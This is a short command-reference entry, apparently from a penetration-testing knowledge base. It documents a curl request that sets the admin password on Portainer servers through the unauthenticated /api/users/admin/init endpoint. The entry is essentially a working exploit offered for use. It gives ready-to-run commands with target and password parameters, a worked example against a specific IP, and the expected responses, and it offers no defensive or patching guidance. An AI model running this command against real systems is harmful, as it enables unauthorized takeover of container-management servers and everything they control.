---
type: command
executor: bash
data: >-
  curl -H "Content-Type: application/json"
  http://$_TARGET_IP:9000/api/users/admin/init -d
  '{"password":"$_NEW_PASSWORD"}'
output: null
platforms:
  - Linux
  - Web
tags:
  - web
  - exploit
  - http
  - json
  - portainer
verified: true
validated: true
---

# curl-post-json-request

## Command

```bash
curl -H "Content-Type: application/json" http://$_TARGET_IP:9000/api/users/admin/init -d '{"password":"$_NEW_PASSWORD"}'
```

## Description

This command sends a POST request with a JSON payload to the Portainer API endpoint for initializing or resetting the admin user password. It is specifically designed for exploiting the unauthenticated admin password reset vulnerability in Portainer (versions prior to 1.24.1). The request sets the Content-Type header to application/json and includes a JSON body specifying the new password.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | IP address or hostname of the target Portainer server (default port 9000 is hardcoded) | Yes |
| $_NEW_PASSWORD | The new password to set for the admin account | Yes |
| -H "Content-Type: application/json" | Sets the HTTP header to indicate JSON payload | Built-in |
| -d '{"password":"$_NEW_PASSWORD"}' | Specifies the JSON data payload containing the password | Built-in |

Note: The endpoint `/api/users/admin/init` and port 9000 are specific to Portainer deployments. Adjust if the instance uses a different port or configuration.

## Examples

### Basic Usage

```bash
curl -H "Content-Type: application/json" http://192.168.1.100:9000/api/users/admin/init -d '{"password":"s3cr3tPass123"}'
```

Executes the request against a local Portainer instance.

### Advanced Usage

For verbose output to inspect headers and response details:

```bash
curl -v -H "Content-Type: application/json" http://$_TARGET_IP:9000/api/users/admin/init -d '{"password":"$_NEW_PASSWORD"}'
```

This adds debugging information, showing the full request/response exchange.

## Expected Output

On successful execution (HTTP 200 OK), the server responds with an empty JSON object indicating the password was set:

```
{}
```

If the admin user already exists or the request fails (HTTP 400 Bad Request), it returns an error message:

```
{"err":"Admin user already exists"}
```

Verify success by checking the HTTP status code (use `-v` for details) or attempting to log in with the new password via the Portainer web interface.

## Related

- [[tools/cURL]]
